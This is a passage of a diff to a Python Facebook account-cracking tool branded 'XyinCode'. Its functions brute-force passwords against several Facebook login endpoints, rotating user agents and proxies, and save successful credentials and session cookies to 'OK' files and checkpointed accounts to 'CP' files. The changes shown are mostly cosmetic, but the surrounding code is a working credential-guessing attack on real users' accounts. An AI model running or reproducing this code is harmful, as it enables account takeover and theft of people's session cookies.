 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				tree = Tree(f" ")
-				tree.add(f"[ CHECKPOINT ]").add(f"[bold yellow]{idf}|{pw}").add(f"[bold white]{ua}\n")
+				tree.add(f"[ CHECKPOINT ]").add(f"[bold red]{idf}|{pw}").add(f"[bold white]{ua}\n")
 				cetak(tree)
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
@@ -1448,7 +1512,7 @@ def crackmbasic(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				tree = Tree(f"  ")
-				tree.add(f"[ SUCCES-LOGIN ]").add(f"[bold green]{idf}|{pw}").add(f"[bold cyan]{ua}\n")
+				tree.add(f"[ SUCCES-LOGIN ]").add(f"[bold white]{idf}|{pw}").add(f"[bold red]{coki}\n").add(f"[bold red]{ua}\n")
 				cetak(tree) 
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+coki+'|'+ua+'\n')
 				cek_apk(session,coki)
@@ -1466,7 +1530,7 @@ def crackfree(idf,pwv):
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
 	ses = requests.Session()
-	prog.update(des,description=f"{h}XyinCode{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
+	prog.update(des,description=f"{h}XyinCode{x} {loop}/{len(id)} OK-:[bold red]{ok}[/] CP-:[bold yellow]{cp}[/]")
 	prog.advance(des) 
 	for pw in pwv:
 		try:
@@ -1482,7 +1546,7 @@ def crackfree(idf,pwv):
 			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				tree = Tree(f" ")
-				tree.add(f"[ CHECKPOINT ]").add(f"[bold yellow]{idf}|{pw}").add(f"[bold white]{ua}\n")
+				tree.add(f"[ CHECKPOINT ]").add(f"[bold red]{idf}|{pw}").add(f"[bold white]{ua}\n")
 				cetak(tree)
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
@@ -1493,7 +1557,7 @@ def crackfree(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				tree = Tree(f"  ")
-				tree.add(f"[ SUCCES-LOGIN ]").add(f"[bold green]{idf}|{pw}").add(f"[bold cyan]{ua}\n")
+				tree.add(f"[ SUCCES-LOGIN ]").add(f"[bold white]{idf}|{pw}").add(f"[bold red]{coki}\n").add(f"[bold red]{ua}\n")
 				cetak(tree) 
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+coki+'|'+ua+'\n')
 				cek_apk(session,coki)
@@ -1511,7 +1575,7 @@ def crackasync(idf,pwv):
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
 	ses = requests.Session()
-	prog.update(des,description=f"{h}XyinCode{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
+	prog.update(des,description=f"{h}XyinCode{x} {loop}/{len(id)} OK-:[bold red]{ok}[/] CP-:[bold yellow]{cp}[/]")
 	prog.advance(des) 
 	for pw in pwv:
 		try:
@@ -1546,7 +1610,7 @@ def crackasync(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				tree = Tree(f" ")
-				tree.add(f"[ CHECKPOINT ]").add(f"[bold yellow]{idf}|{pw}").add(f"[bold white]{ua}\n")
+				tree.add(f"[ CHECKPOINT ]").add(f"[bold red]{idf}|{pw}").add(f"[bold white]{ua}\n")
 				cetak(tree)
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
@@ -1557,7 +1621,7 @@ def crackasync(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				tree = Tree(f"  ")
-				tree.add(f"[ SUCCES-LOGIN ]").add(f"[bold green]{idf}|{pw}").add(f"[bold cyan]{ua}\n")
+				tree.add(f"[ SUCCES-LOGIN ]").add(f"[bold white]{idf}|{pw}").add(f"[bold red]{coki}\n").add(f"[bold red]{ua}\n")
 				cetak(tree) 
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+coki+'|'+ua+'\n')
 				cek_apk(session,coki)
@@ -1575,7 +1639,7 @@ def crackreguler(idf,pwv):
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
 	ses = requests.Session()
-	prog.update(des,description=f"{h}XyinCode{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
+	prog.update(des,description=f"{h}XyinCode{x} {loop}/{len(id)} OK-:[bold red]{ok}[/] CP-:[bold yellow]{cp}[/]")
 	prog.advance(des) 
 	for pw in pwv:
 		try:
@@ -1610,7 +1674,7 @@ def crackreguler(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				tree = Tree(f" ")
-				tree.add(f"[ CHECKPOINT ]").add(f"[bold yellow]{idf}|{pw}").add(f"[bold yellow]{ua}\n")
+				tree.add(f"[ CHECKPOINT ]").add(f"[bold red]{idf}|{pw}",width=90,style=f"bold white").add(f"[bold white]{ua}\n",width=90,style=f"bold red")
 				cetak(tree)
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
@@ -1621,9 +1685,10 @@ def crackreguler(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				tree = Tree(f"  ")
-				tree.add(f"[ SUCCES-LOGIN ]").add(f"[bold green]{idf}|{pw}").add(f"[bold cyan]{ua}\n")
+				tree.add(f"[ SUCCES-LOGIN ]").add(f"[bold white]{idf}|{pw}",width=90,style=f"bold red").add(f"[bold red]{coki}\n",width=90,style=f"bold white").add(f"[bold red]{ua}\n",width=90,style=f"bold white")
 				cetak(tree) 
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+coki+'|'+ua+'\n')
+				
 				cek_apk(session,coki)
 				break
 				
